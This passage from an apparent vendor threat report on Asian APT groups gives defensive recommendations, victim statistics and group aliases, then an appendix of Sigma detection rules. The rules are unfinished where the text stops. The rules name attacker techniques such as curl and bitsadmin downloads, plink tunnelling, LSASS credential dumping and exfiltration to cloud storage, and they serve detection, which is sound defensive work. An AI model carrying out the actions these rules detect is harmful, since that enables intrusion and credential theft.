regulate which specific users can start certain applications. One welladvised scenario would be to configure rules/policies that block the startup of applications that are not\nspecifically indicated on an allowlist. These lists are created based on the operational requirements of specific\nemployees and departments.\n\n**Principle of least privilege**\n\nConsider implementing the principle of least privilege, which requires that employees are granted only the\nminimum required permissions to perform their specific work. An inventory of rights and permissions must also\nbe regularly conducted, so that users only retain the permissions that they currently need.\n\n###### Preventing lateral movement\n\n**Network segmentation**\n\nConsider segmenting the network. By dividing a network into segments and restricting non-typical\nconnections between them, you can significantly reduce the risk of attack propagation over the network and\nhinder lateral movement of an attacker.\n\n**Replacing obsolete technologies**\n\nConsider replacing or disabling obsolete technologies that are vulnerable to attacks[17]. Protocols like NBT-NS\nand LLMNR allow attackers to conduct Man-in-the-Middle attacks, while the NTLM protocol is architecturally\nvulnerable to relay attacks. A modern network environment allows you to use the DNS and Kerberos protocols\nfor the same purposes as those older protocols.\n\n**Password policies**\n\nConsider implementing password policies. This will help reduce the number of weak passwords in your\ncompany. We also advise to implement Password Filtering[18] technology, which requires to install a DLL library\non the domain controller to prevent users from setting passwords like \"Pssword1\" and \"Company2023\".\n\n**Protecting account credentials**\n\nConsider using Credential Guard technology, which provides a security component that lets you store account\ncredentials in the address space of an isolated LSA process (isolation is achieved through virtualization). Since\nAsian APT groups use many ways to dump credentials, both through self-written malware and using system\nlegitimate utilities. In the “Technical Details” section, we showed the ways in which Asian APT groups obtain\ncredentials from the LSASS process memory, from the SAM database, as well as from password stores.\n\n18\nFirst you must consider switching to different protocols for your applications before disabling them. If specific software cannot work\nwith newer protocols, you should consider allocating a separate network for hosts where the obsolete software is installed. This will help\nlimit exploitation of vulnerable technologies.\n\n19\n\nPassword\n\n\n[Learn more](https://learn.microsoft.com/en-us/windows/win32/secmgmt/installing-and-registering-a-password-filter-dll)\n\n\n-----\n\n**Protecting privileged accounts**\n\nConsider using the Protected Users group in Active Directory. By adding high-privilege accounts to this group,\nyou can reduce the risk of attackers stealing the account credentials of these users (for example, by capturing\nthem from the address space of the lsass.exe process).\n\n**Using honeypots**\n\nConsider using honeypots in the infrastructure. They increase your chances of detecting an attack before any\nreal damage is done.\n\n**Zero Trust architecture**\n\nConsider implementing Zero Trust principles in your organization. The main concepts and principles of this type\nof architecture are discussed in NIST Special Publication 800-207.\n\n[Learn more](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf)\n\n###### Preventing attackers from fulfilling their objectives\n\nThe main goal of Asian APT groups is to obtain information. For this reason, we must not only provide an\nappropriate access model for this information, but also have the capability to detect when it is being stolen.\n\nAttackers use various services for exfiltration of targeted information, including cloud storage, such as\nYandex.Disk, Google drive, DropBox, FileIO and others. The asset management, configuration management\nand identity management processes help us understand which devices in an organization typically connect\nto external (untrusted) resources and which devices interact with information that is sought by attackers.\nRational resource management based on information gathered during these processes will help reduce the\nrisk of unauthorized access. Armed with technical information about the resources of the company and its\nprocesses, administrators and the security team can also configure an advanced, company-specific audit that\nwill catch suspicious events, such as a network connection with a file server from a non-typical host.\n\n\n-----\n\n##### Statistics on attacked companies\n\nAs a supplement to the technical details and descriptions of potential attack vectors within the context of the\nUnified Kill Chain concept discussed earlier, this section provides some statistics on companies targeted by\nattacks all over the world based on data from the Kaspersky Threat Attribution Engine and our internal data on\nthe activity of specific groups.\n\nFigure 70 Kaspersky Threat Attribution Engine interface\n\n\n-----\n\n|Col1|Comment Turbine Panda Panda 3% 2%|Col3|Col4|\n|---|---|---|---|\n|Karma Panda 5%||||\n|||||\n\n\nThese statistics were formed from the following methodology:\n\nsamples taken from the global threat data network known as Kaspersky Security Network (KSN) were fed as\ninput into the Kaspersky Threat Attribution Engine. The samples that were attributed to Asian APT groups were\nadditionally enriched with information about the particular industry and country.\n\n###### Statistics on companies attacked by the studied groups\n\n Comment Turbine Rocke Panda Panda 1% 3% 2%\n\n Karma Panda 5%\n\n Stone\n Override\n Panda\n Panda\n 17%\n 7%\n\n Lotus Panda Emissary 10% Panda\n 16%\n\n Vicious Panda 12%\n Mustang Panda APT41 14% 13%\n\n\n-----\n\n###### The share of the actor’s victims among the  victims of all groups\n\n17%\n\n16%\n\n14%\n\n\n###### APT actor Top 5  countries by volume of victims.\n\n\n###### The country’s share in the total volume of attacked  organizations.\n\n13%\n11%\n9%\n8%\n8%\n\n12%\n11%\n10%\n6%\n6%\n\n54%\n11%\n9%\n5%\n4%\n\n\nStone Panda\n\nAliases:\n\n- APT10 (Mandiant)\n\n- menuPass (Palo Alto)\n\n- menuPass Team (Symantec)\n\n- Potassium (Microsoft)\n\n- Red apollo (PWC)\n\n- CVNX (BAE Systems)\n\n- Hogfish (iDefense)\n\n- Happyyongzi (FireEye)\n\n- Cicada (Symantec)\n\n- Bronze Riverside (SecureWorks)\n\n- CTG-5938 (SecureWorks)\n\n- ATK 41 (Thales)\n\n- TA429 (Proofpoint)\n\n- ITG01 (IBM)\n\nEmissary Panda\n\nAliases:\n\n- APT27 (Mandiant)\n\n- TG-3390 (SecureWorks)\n\n- Bronze Union (SecureWorks)\n\n- Lucky Mouse (Kaspersky)\n\n- TEMP.Hippo (Symantec)\n\n- Red Phoenix (PWC)\n\n- Budworm (Symantec)\n\n- ATK 15 (Thales)\n\n- Group 35 (Talos)\n\n- ZipToken\n\n- GreedyTaotie\n\n- Iron Taurus (Palo Alto)\n\n- Iron Tiger (Trend Micro)\n\n- Earth Smilodon (Trend Micro)\n\nMustang Panda\n\nAliases:\n\n- Bronze President (SecureWorks)\n\n- TEMP.Hex (FireEye)\n\n- HoneyMyte (Kaspersky)\n\n- Red Lich (PWC)\n\n- Earth Preta (Trend Micro)\n\n- Camaro Dragon (Check Point)\n\n\nEgypt\nIran\nJapan\nIndia\nGermany\n\nEgypt\nIran\nTurkey\nRussia\nIndia\n\nVietnam\nMyanmar\nEthiopia\nChina\nMongolia\n\n\n-----\n\n###### The share of the actor’s victims among the  victims of all groups\n\n13%\n\n12%\n\n10%\n\n7%\n\n5%\n\n\n###### APT actor Top 5  countries by volume of victims.\n\n\n###### The country’s share in the total volume of attacked  organizations.\n\n16%\n12%\n11%\n7%\n4%\n\n38%\n16%\n14%\n4%\n3%\n\n23%\n14%\n13%\n4%\n4%\n\n32%\n17%\n8%\n6%\n4%\n\n36%\n12%\n9%\n5%\n5%\n\n\nAPT41\n\nAliases:\n\n- Blackfly (Symantec)\n\n- Wicked Panda (CrowdStrike)\n\n- Winnti Group (Kaspersky)\n\n- Barium (Microsoft)\n\nVicious Panda\n\nAliases:\n\n- Microcin\n\n- SixLittleMonkeys\n\n- Bronze Dudley (SecureWorks)\n\nLotus Panda\n\nAliases:\n\n- Naikon (Kaspersky)\n\n- Hellsing (Kaspersky)\n\n- ITG06 (IBM)\n\nOverride Panda\n\nAliases:\n\n- APT 30 (Mandiant)\n\n- CTG-5326 (SecureWorks)\n\n- Bronze Geneva (SecureWorks)\n\n- Bronze Sterling (SecureWorks)\n\n- RADIUM (Microsoft)\n\n- Raspberry Typhoon (Microsoft)\n\nKarma Panda\n\nAliases:\n\n- Tonto Team (FireEye)\n\n- HeartBeat (Trend Micro)\n\n- CactusPete (Kaspersky)\n\n- Bronze Huntley (SecureWorks)\n\n\nEgypt\nRussia\nIran\nIndia\nUS\n\nRussia\nKazakhstan\nChina\nKyrgyzstan\nTajikistan\n\nVietnam\nChina\nMyanmar\nRussia\nIndia\n\nIndia\nGermany\nChina\nMalaysia\nJapan\n\nRussia\nChina\nMongolia\nTurkey\nSouth Korea\n\n\n-----\n\n###### APT actor Top 5  The country’s share The share of the countries by in the total volume actor’s victims volume of of attacked  among the  victims. organizations. victims of all\n groups\n\nComment Panda South Korea 15% 3%\n\nVietnam 15%\nRussia 9%\n\nAliases:\n\nUS 8%\n\n   - Comment Crew (Symantec) India 6%\n\n    - APT1 (Mandiant)\n\n    - TG-8223 (SecureWorks)\n\n   - BrownFox (Symantec)\n\n    - Group 3 (Talos)\n\n    - Byzantine Hades (US State\nDepartment)\n\n    - Byzantine Candor (US State\nDepartment)\n\n    - Shanghai Group (SecureWorks)\n\n    - GIF89a (Kaspersky)\n\nTurbine Panda Brazil 11% 2%\n\nRussia 8%\nAlgeria 8%\n\nAliases:\n\nGermany 8%\n\n    - APT 26 (Mandiant) India 6%\n\n    - Shell Crew (RSA)\n\n    - WebMasters (Kaspersky)\n\n    - KungFu Kittens (FireEye)\n\n    - Group 13 (Talos)\n\n    - PinkPanther (RSA)\n\n    - Bronze Express (SecureWorks)\n\n    - JerseyMikes\n\nRocke Russia 21% 1%\n\nFrance 17%\nBrazil 8%\n\nAliases:\n\nChina 6%\n\n    - Iron Group (Intezer) India 4%\n\n\n-----\n\n###### APT actor Top by industry Top by number of victims (organizations)\n\nHealthcare 70%\nStone Panda Government 27%\nIndustrial sector 3%\n\nHealthcare 68%\nEmissary Panda Government 28%\nIndustrial sector 4%\n\nHealthcare 70%\nAPT 41 Government 26%\nIndustrial sector 4%\n\nConstruction 56%\nVicious Panda Government 29%\nIndustrial sector 15%\n\nGovernment 70%\nLotus Panda Industrial sector 20%\nHealthcare 10%\n\nFinance 35%\nOverride Panda Government 34%\nIndustrial sector 31%\n\nAgriculture 39%\nKarma Panda IT 33%\nIndustrial sector 28%\n\nGovernment 40%\nComment Panda Industrial sector 40%\nHealthcare 20%\n\nAgriculture 40%\nTurbine Panda Industrial sector 40%\nIT 20%\n\nEnergy industry 37%\nRocke Healthcare 34%\nIT 29%\n\nWhen interpreting the results of our statistics, it is important to consider the limitations of our study. Even\nafter analyzing more than a hundred different incidents and thousands of malware samples related to Asian\nAPT groups, we still can't confidently say that the volume of our analyzed sample fully reflects the total volume\nof threats and statistics for the entire world.\n\n\n-----\n\n##### Conclusions\n\nThank you very much for taking the time to read this report. We highly appreciate your commitment to\nprotecting your organization and analyzing data related to cybersecurity.\n\nWhat conclusions can be drawn after reading the report?\n\n###### The “Asian threat” is especially dangerous for government agencies and the military- industrial complex\n\nThe campaigns of Asian groups are directed against organizations from many industries and are not limited\nto one region. As victimology research shows, they are especially active in relation to government and military\nstructures. Asian APT groups typically steal data and engage in espionage without resorting to extortion,\nencryption or disruption of business processes. This may indicate the attackers' primary intent is to obtain\ninformation that can be used for political manipulation or intelligence purposes.\n\n###### Asian APT groups have their own signature\n\nThe section “Analysis of the actions of attackers based on the “Unified Kill Chain”” describes patterns\ncharacteristic of the work of groups from Asia. Defenders should pay attention to them: they can help not only\nidentify attackers, but also notice a developing attack at an early stage.\n\n###### Asian APT attacks can be stopped\n\nIt is widely believed that Asian APT attacks are so sophisticated and sophisticated that the likelihood of them\nbeing detected and stopped in time is close to zero. However, most attacks carried out by Asian APTs consist\nof simple steps and involve the use of well-known utilities. The success of these attacks is explained by the\nweak level of development of information security processes in the victim organizations.\n\n###### An effective security strategy includes properly organized processes in the SOC, security tools and special security mechanisms\n\nThe report can be used as a guide to building defenses against Asian APT attacks. It includes potential\nprotection mechanisms, including SIGMA rules that are ready to be implemented in the infrastructure, and\nsecurity rules that will help reduce the impact of the described incidents. The most effective protection\ninvolves the use of these mechanisms along with modern security solutions - such as EPP/EDR/Sandbox - and\nproperly organized work of the SOC in accordance with the practices of Hardening & Security, Vulnerability\nManagement and Asset Management.\"\n\nWe started this report with the quote, \"There is no teacher but the enemy\", and we sincerely hope that\nyou know your enemy much better now after analyzing the material that we presented.\n\n\n-----\n\n##### Appendix I — Sigma Rules\n\n###### Techniques SIGMA\n\n\nPhishing: Spearphishing\nAttachment T1566.001\n\nCommand and Scripting\nInterpreter: Windows Command\nShell T1059.003\n\nCommand and Scripting\nInterpreter: PowerShell\nT1059.001\n\nWindows Management\nInstrumentation T1047\n\nEvent Triggered Execution:\nWindows Management\nInstrumentation Event\nSubscription T1546.003\n\nEvent Triggered Execution:\nImage File Execution Options\nInjection T1546.012\n\n\n\n- Sigma-Generic-Shell Creation by Trusted Process\n\n- Sigma-Generic-Drop and execution file from a trusted process\n\n- Sigma-Generic-LNK Creation from Archive\n\n- Sigma-Generic-System Information Discovery via Standard Windows Utilities\n\n- Sigma-Generic-System Network Configuration Discovery via Standard Windows\nUtilities\n\n- Sigma-Generic-Remote System Discovery via Standard Windows Utilities\n\n- Sigma-Generic-File Download via Bitsadmin\n\n- Sigma-Generic-Ingress Tool Transfer via curl.exe\n\n- Sigma-Generic-Compress Data for Exfiltration via Archiver\n\n- Sigma-Generic-PowerShell Suspicious Arguments\n\n- Sigma-Generic-Execution of Downloaded PowerShell Code\n\n- Sigma-Generic-PowerShell Code Execution from File\n\n- Sigma-Generic-PowerShell Code Execution from Registry\n\n- Sigma-Generic-Suspicious Command wmic.exe\n\n- Sigma-Generic-Suspicious Child Process Wmiprvse.exe\n\n- Sigma-Generic-System Service Discovery via wmic\n\n- Sigma-Generic-Permission Local Groups Discovery via wmic\n\n- Sigma-Generic-Security Software Discovery via wmic\n\n- Sigma-Generic-Changing MOF Self-Install Directory via Registry\n\n- Sigma-Generic-MOF file changing/creation\n\n- Sigma-Generic-Persistence by Image File Execution Options via Registry\n\n- Sigma-Generic-Accessibility Features Backdoor Installation via ifeo debugger\n\n- Sigma-Generic-Silent Process Exit Monitoring persistence via PowerShell\n\n- Sigma-Generic-Application Verifier Persistence via PowerShell\n\n- Sigma-Generic-Image File Execution Options Injection via SilentProcessExit\n\n- Sigma-Generic-Accessibility Features Backdoor Installation via SilentProcessExit\nMonitoring\n\n\nBITS Jobs T1197 - Sigma-Generic-File Download via Bitsadmin\n\n                      - Sigma-Generic-Not Standard Parent Process Bitsadmin\n\n\nScheduled Task/Job: Scheduled\nTask T1053.005\n\n\n\n- Sigma-Generic-Windows Shell Started Schtasks\n\n- Sigma-Generic-Suspicious Schtasks.exe Arguments\n\n- Sigma-Generic-Scheduled Task Start from Public Directory\n\n\n-----\n\n###### Techniques SIGMA\n\n\nServer Software Component:\nWeb Shell T1505.003\n\nCreate or Modify System\nProcess: Windows Service\nT1543.003\n\nHijack Execution Flow: DLL\nSearch Order Hijacking\nT1574.001\n\nIndicator Removal: File Deletion\nT1070.004\n\nIndicator Removal: Network\nShare Connection Removal\nT1070.005\n\n\n\n- Sigma-Generic-Windows Shell Start by Web Applications\n\n- Sigma-Generic-Windows Service Creation or Modification via sc.exe\n\n- Sigma-Generic-Remote Windows Service Creation or Modification via sc.exe\n\n- Sigma-Generic-Windows Service Creation or Modification via PowerShell.exe\n\n- Sigma-Generic-Service manipulations via net.exe\n\n- Sigma-Generic-Windows Service Creation from non-system directory via Registry\n\n- Sigma-Genetic-Modification of SvcHost Group in Registry\n\n- Sigma-Generic-Windows Service Path Modification in Registry\n\n- Sigma-Generic-IKEEXT service DLL Hijacking\n\n- Sigma-Generic-SessionEnv service DLL Hijacking\n\n- Sigma-Generic-File Deletion Using Ping.exe\n\n- Sigma-Generic-Network Share Deleted\n\n\nProcess Injection T1055 - Sigma-Generic-Dynamic-link Library Injection via LoadLibrary\n\n                      - Sigma-Generic-Remote Thread creation to critical Windows process\n\n\nProcess Injection: Process\nHollowing T1055.012\n\nImpair Defenses: Disable or\nModify Tools T1562.001\n\nObfuscated Files or Information\nT1027\n\n\n\n- Sigma-Generic-Executing File Named as System Tool in Unusual Directory\n\n- Sigma-Generic-Anomaly in the Windows Critical Process Tree\n\n- Sigma-Generic-Shell Creation by Critical Windows Process\n\n- Sigma-Generic-Svchost.exe Start with no Standard Parameters\n\n- Sigma-Generic-Rundll32 Start with no Standard Parameters\n\n- Sigma-Generic-Process Hollowing\n\n- Sigma-Generic-Disabling Critical Service\n\n- Sigma-Generic-Disabling SmartScreen Protection via Registry\n\n- Sigma-Generic-Disabling Windows Defender via Dism\n\n- Sigma-Generic-Disabling Windows Defender via Registry\n\n- Sigma-Generic-Windows Defender Exclusions Modification via Registry\n\n- Sigma-Generic-Windows Defender Modification via PowerShell\n\n- Sigma-Generic-Encoded/decoded PowerShell Сode Execution (ps_script)\n\n- Sigma-Generic-Obfuscation via Escape Characters in Command Line\n\n- Sigma-Generic-XOR-ed PowerShell Command\n\n- Sigma-Generic-XOR-ed PowerShell Command (ps_script)\n\n\n-----\n\n###### Techniques SIGMA\n\nMasquerading T1036 - Sigma-Generic-Anomaly in the Windows Critical Process Tree\n\n                      - Sigma-Generic-Svchost.exe Start with no Standard Parameters\n\n                       - Sigma-Generic-Shell Creation by Critical Windows Process\n\n                      - Sigma-Generic-Rundll32 Start with no Standard Parameters\n\n\nMasquerading: Masquerade Task\nor Service T1036.004\n\nMasquerading: Match Legitimate\nName or Location T1036.005\n\nOS Credential Dumping: LSASS\nMemory T1003.001\n\nOS Credential Dumping:\nSecurity Account Manager\nT1003.002\n\nOS Credential Dumping: NTDS\nT1003.003\n\nUnsecured Credentials:\nCredentials In Files T1552.001\n\nCredentials from Password\nStores: Credentials from Web\nBrowsers T1555.003\n\n\n\n- Sigma-Generic-Creating Windows Service appearing to be legitimate\n\n- Sigma-Generic-Executing File Named as System Tool in Unusual Directory\n\n- Sigma-Generic-Image Loaded into lsass.exe\n\n- Sigma-Generic-Lsass Dump via LOLBin\n\n- Sigma-Generic-LSASS Memory Access via Leaked Handle Seclogon\n\n- Sigma-Generic-Process Dump via Comsvcs.dll\n\n- Sigma-Generic-Suspicious LSASS Memory Access\n\n- Sigma-Generic-Detected Access to SAM,SYSTEM and SECURITY registry hives\n\n- Sigma-Generic-Dumping SAM via Command Line\n\n- Sigma-Generic-Saving ndts.dit via ntdsutil.exe\n\n- Sigma-Generic-Copying ntds.dit from Volume Shadow Copy\n\n- Sigma-Generic-Extracting Credentials from Files via PowerShell\n\n- Sigma-Generic-Suspicious Access to Credentials from Web Browsers\n\n\nSoftware Discovery T1518 - Sigma-Generic-Software Discovery via Standard Windows Utilities\n\n                      - Sigma-Generic-Security Software Discovery via wmic\n\n                      - Sigma-Generic-Discovery Component Object Model Keys via PowerShell\n\n\nSystem Service Discovery\nT1007\n\nSystem Information Discovery\nT1082\n\n\n\n- Sigma-Generic-System Service Discovery via Standard WIndows Utilities\n\n- Sigma-Generic-System Service Discovery via PowerShell\n\n- Sigma-Generic-System Service Discovery via Registry\n\n- Sigma-Generic-System Service Discovery via wmic\n\n- Sigma-Generic-System Information Discovery via Standard Windows Utilities\n\n\n-----\n\n###### Techniques SIGMA\n\n\nSystem Network Configuration\nDiscovery T1016\n\nSystem Network Connections\nDiscovery T1049\n\n\n\n- Sigma-Generic-System Network Configuration Discovery via Standard\nWindows Utilities\n\n- Sigma-Generic-Network Connection to Online IP Resolution Web Service (EventID 3)\n\n- Sigma-Generic-Network Connection to Online IP Resolution Web Service\n(EventID 22)\n\n- Sigma-Generic-System Network Connections Discovery via PowerShell\n\n- Sigma-Generic-System Network Connections Discovery via Standard Windows\nUtilities\n\n\nSystem Time Discovery T1124 - Sigma-Generic-Sigma-Generic-System Time Discovery via PowerShell\n\n                       - Sigma-Generic-System Time Discovery via standard windows utilities\n\n\nPermission Groups Discovery:\nDomain Groups T1069.002\n\n\n\n- Sigma-Generic-Permission Local Groups Discovery via wmic\n\n- Sigma-Generic-Local Groups Discovery via net.exe\n\n- Sigma-Generic-Local Groups Discovery via PowerShell\n\n- Sigma-Generic-Domain Groups Discovery via net.exe\n\n- Sigma-Generic-Groups Discovery via PowerShell\n\n\nNetwork Share Discovery T1135 - Sigma-Generic-Network Share Discovery via PowerShell\n\n                       - Sigma-Generic-Network Share Discovery via Standard Windows Utilities\n\nRemote System Discovery T1018 - Sigma-Generic-Remote System Discovery via PowerShell\n\n                      - Sigma-Generic-Remote System Discovery via Standard Windows Utilities\n\nDomain Trust Discovery T1482 - Sigma-Generic-Domain Trust Discovery via nltest.exe\n\nAccount Discovery T1087 - Sigma-Generic-Local Account Discovery via Standard Windows Utilities\n\n                      - Sigma-Generic-Domain Account Discovery via PowerShell\n\n\nFile and Directory Discovery\nT1083\n\n\n\n- Sigma-Generic-Suspicious Wildcard Searching Data\n\n\nGroup Policy Discovery T1615 - Sigma-Generic-Group Policy Discovery via gpresult\n\n                       - Sigma-Generic-Group Policy Discovery via PowerShell\n\nProcess Discovery T1057 - Sigma-Generic-Process Discovery via PowerShell\n\n                       - Sigma-Generic-Process Discovery via Standard Windows Utilities\n\n\nSystem Owner/User Discovery\nT1033\n\n\n\n- Sigma-Generic-Anomaly Parent Process whoami.exe\n\n- Sigma-Generic-System Owner/User Discovery via PowerShell\n\n- Sigma-Generic-System Owner/User Discovery via Standard Windows Utilities\n\n- Sigma-Generic-System Owner/User Discovery via Suspicious CommandLine whoami\n\n\n-----\n\n###### Techniques SIGMA\n\n\nRemote Services: SMB/\nWindows Admin Shares\nT1021.002\n\n\n\n- Sigma-Generic-Remote Windows Service Creation or Modification via sc.exe\n\n- Sigma-Generic-Mounting Shares via net\n\n- Sigma-Generic-Suspicious Schtasks.exe Arguments\n\n- Sigma-Generic-Suspicious PsExec Execution\n\n- Sigma-Generic-PsExec Pipes Artifacts\n\n\nLateral Tool Transfer T1570 - Sigma-Generic-File Download via Bitsadmin\n\n                      - Sigma-Generic-Bitsadmin Job via PowerShell\n\n\nArchive Collected Data: Archive\nvia Utility T1560.001\n\n\n\n- Sigma-Generic-Compress Data for Exfiltration via Archiver\n\n- Sigma-Generic-Archive via PowerShell\n\n- Sigma-Generic-Windows Shell Started Archive Utility\n\n- Sigma-Generic-Archive File in Local Users Folders via Makecab.exe\n\n- Sigma-Generic-Archiving Files in Recycle Bin via Archive\n\n\nAutomated Collection T1119 - Sigma-Generic-Possible wildcard collection sensitive data via PowerShell\n\n                      - Sigma-Generic-Suspicious Wildcard Searching Data\n\nData from Local System T1005 - Sigma-Generic-Possible wildcard collection sensitive data via PowerShell\n\n                      - Sigma-Generic-Suspicious Wildcard Searching Data\n\nWeb Service T1102 - Sigma-Generic-Network Connection to Cloud Storage\n\n                      - Sigma-Generic-Network Connection to Cloud Storage in Command Line\n\nIngress Tool Transfer T1105 - Sigma-Generic-Network Connection to Cloud Storage\n\n                      - Sigma-Generic-Network Connection to Cloud Storage in Command Line\n\n                        - Sigma-Generic-Ingress Tool Transfer via certutil\n\n                        - Sigma-Generic-Ingress Tool Transfer via curl.exe\n\n                      - Sigma-Generic-File Download via Bitsadmin\n\n                     - Sigma-Generic-Execution of Downloaded PowerShell Code\n\nProtocol Tunneling T1572 - Sigma-Generic-Protocol Tunneling via Plink Utility\n\n                      - Sigma-Generic-Ssh Connection to non-standard port\n\n\nExfiltration Over Web Service:\nExfiltration to Cloud Storage\nT1567.002\n\nExfiltration Over C2 Channel\nT1041\n\n\n\n- Sigma-Generic-Network Connection to Cloud Storage\n\n- Sigma-Generic-Network Connection to Cloud Storage in Command Line\n\n- Sigma-Generic-Protocol Tunneling via Plink Utility\n\n- Sigma-Generic-Ingress Tool Transfer via curl.exe\n\n- Sigma-Generic-Execution of Downloaded PowerShell Code\n\n- Sigma-Generic-Exfiltration via pscp.exe\n\n\n-----\n\n###### Sigma Rules\n\n\ntitle: Shell Creation by\nTrusted Process\n\nid: a93089e4-8312-409a-826e6c13d1ad6b36\ndescription: Start windows shell\nfrom frequent attachment format\nin a letter\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.InitialAccess\n- attack.Execution\n- attack.T1204.002\n- attack.T1566.001\n- attack.T1059\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nParentImage|endswith:\n- '\\winword.exe'\n- '\\access.exe'\n- '\\excel.exe'\n- '\\mspub.exe'\n- '\\powerpnt.exe'\n- '\\visio.exe'\n- '\\outlook.exe'\n- '\\wordpad.exe'\n- '\\notepad.exe'\n- '\\AcroRd32.exe'\n- '\\acrobat.exe'\nImage|endswith:\n- '\\mshta.exe'\n- '\\wscript.exe'\n- '\\mftrace.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\scriptrunner.exe'\n- '\\cmd.exe'\n- '\\forfiles.exe'\n- '\\msiexec.exe'\n- '\\rundll32.exe'\n- '\\wmic.exe'\n- '\\hh.exe'\n- '\\regsvr32.exe'\n- '\\schtasks.exe'\n- '\\scrcons.exe'\n- '\\bash.exe'\n- '\\sh.exe'\n- '\\cscript.exe'\nfilter:\nImage|endswith:\n- '\\rundll32.exe'\nCommandLine|contains:\n\n\n- 'ndfapi.dll'\n- 'tcpmonui.dll'\n- 'printui.dll'\n- 'devmgr.dll'\n- 'keymgr.dll'\n- 'powrprof.dll'\n- 'advapi32.dll'\n- 'shdocvw.dll'\n- 'user32.dll'\n- 'shell32.dll'\ncondition: selection and not filter\nfalsepositives:\n- Unknown\nlevel: high\n\n\ntitle: LNK Creation from\nArchive\n\nid: 33aa7387-abd7-4bb6-91cf76fa491d7aef\ndescription: Detects creation of .lnk\nfile by Archivator process\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Initial Access\n- attack.Execution\n- attack.t1566.002\n- attack.t1204.001\nlogsource:\nproduct: windows\ncategory: file_creation\ndetection:\nselection:\nImage|contains|re:\n- '(?i)\n((WinRAR|7zip|PowerArchiv\ner|PeaZip|(WinZip\\\nd+)|Bandizip|ZipGe\nnius|IZArc|ExtractNow|(uniextract\\\nd+)\n|ZipItFree|HamsterArc|HaoZip|TU\nGZip)(\\.exe)?)'\nTargetFilename|contains:\n- '.lnk'\ncondition: selection\nfalsepositives: Unknown\nlevel: medium\n\n\n-----\n\ntitle: System Network\nConfiguration Discovery via\nStandard Windows Utilities\n\nid: be44c509-3a5e-4d49-acfb61c3cdf5432e\ndescription: System Network\nConfiguration Discovery via\nStandard Windows Utilities\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.T1016\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection1:\nImage|endswith: '\\ipconfig.exe'\nCommandLine|contains: '/all'\nselection2:\nImage|endswith: '\\nbtstat.exe'\nCommandLine|contains:\n- '-c'\n- '-n'\n- '-r'\n- '-s'\nselection3:\nImage|endswith: '\\netsh.exe'\nCommandLine|contains|all:\n- 'interface'\n- 'show'\nselection4:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nCommandLine|contains: 'config'\nselection5:\nImage|endswith: '\\arp.exe'\nCommandLine|contains: '-a'\ncondition: selection1 or selection2\nor selection3 or selection4 or\nselection5\nfalsepositives:\n- Administrators\nlevel: low\n\n\ntitle: Drop and execution file\nfrom a trusted process\n\nid: 7aa06833-3c96-474f-90436e8358074940\ndescription: An adversary may\nweaponize an office document to\ndrop and execute the malicious\npayload\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.InitialAccess\n- attack.Execution\n- attack.T1204.002\n- attack.T1566.001\nlogsource:\nproduct: windows\ncategory: file_creation\ndetection:\nselection1:\nImage|contains:\n- '\\winword.exe'\n- '\\access.exe'\n- '\\excel.exe'\n- '\\mspub.exe'\n- '\\powerpnt.exe'\n- '\\visio.exe'\n- '\\outlook.exe'\n- '\\wordpad.exe'\n- '\\notepad.exe'\n- '\\AcroRd32.exe'\n- '\\acrobat.exe'\nselection2:\nTargetFilename|contains:\n\n\ntitle: System Information\nDiscovery via Standard\nWindows Utilities\n\nid: 0ea59ef4-1152-4371-bc1893a4d47d65a5\ndescription: System Information\nDiscovery via Standard Windows\nUtilities\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.discovery\n- attack.T1016\nlogsource:\ncategory: process_creation\nproduct: windows\n\n\ndetection:\nselection1:\nImage|endswith: '\\systeminfo.\nexe'\nselection2:\nImage|endswith: '\\hostname.\nexe'\ncondition: selection1 or selection2\nfalsepositives:\n- Administrators\nlevel: low\n\n\n-'.bat'\n-'.cmd'\n-'.cpl'\n-'.exe'\n-'.hta'\n-'.dll'\n-'.reg'\n-'.vb'\n-'.vbe'\n-'.vbs'\n-'.vba'\n-'.wsf'\n-'.wsc'\n-'.ps1'\n-'.jse'\n-'.js'\n-'.msi'\n-'.sct'\n-'.pif'\n-'.paf'\n-'.rgs'\ncondition: selection1 and\nselection2\nfalsepositives: unknown\nlevel: high\n\n\n-----\n\ntitle: File Download via\nBitsadmin\n\nid: 699f82e9-cfa3-4fd1-a95d13ceca861992\ndescription: Detects using\nBitsadmin to download file\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.defense_evasion\n- attack.persistence\n- attack.t1197\n- attack.lateral_movement\n- attack.t1570\n- attack.command_and_control\n\n\n- attack.t1105\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith: 'bitsadmin.exe'\nCommandLine|contains:\n- 'http'\n- 'ftp'\n- '\\\\'\n- 'download'\n- 'copy'\n- 'transfer'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\ntitle: Ingress Tool Transfer via\ncurl.exe\n\nid: 06de518a-46e7-4566-b02929baf2b1957b\ndescription: Detects Ingress Tool\nTransfer via curl.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.command_and_control\n- attack.t1105\n- attack.t1071\n\n\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- 'curl.exe'\nCommandLine|re:\n- '(?i)(http|ftp)s?:\\/\\/.*'\ncondition: selection\nfalsepositives:\nAdministrators or developers\nactivity\nlevel: low\n\n\ntitle: Generic-Protocol\nTunneling via Plink Utility\n\nGeneric-Protocol Tunneling via Plink\nUtility\nid: ec39daaf-cacf-4995-aec5ffd7cff5d772\ndescription: Adversaries may\nattempt to set up tunnels via the\nplink utility.\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.command_and_control\n- attack.T1572\nlogsource:\n\n\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nprocess:\nImageName|endswith: 